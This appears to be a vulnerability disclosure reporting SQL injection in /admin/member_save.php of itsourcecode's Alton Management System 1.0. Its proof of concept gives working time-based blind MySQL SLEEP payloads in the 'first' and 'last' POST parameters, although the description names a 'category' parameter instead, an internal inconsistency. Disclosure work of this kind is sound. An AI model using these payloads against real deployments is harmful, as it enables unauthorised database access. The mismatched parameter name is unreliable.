# Vendor

itsourcecode

# Product

Alton Management System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2020/02/altonsystem.zip

# Description

Log in as an administrator user, access the "/admin/member_save.php" page, and pass in the category parameter. Due to lax filtering, this parameter can lead to SQL injection vulnerabilities.
<img width="1078" alt="image" src="https://github.com/user-attachments/assets/b24aea4e-41f2-49fa-98db-f3530ae978d9">

# Poc

```
Parameter: first (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: last=123&first=123' AND (SELECT 9651 FROM (SELECT(SLEEP(5)))LDVG) AND 'Zjoq'='Zjoq&contact=123&address=123

Parameter: last (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: last=123' AND (SELECT 9207 FROM (SELECT(SLEEP(5)))IyrR) AND 'YcaK'='YcaK&first=123&contact=123&address=123
```
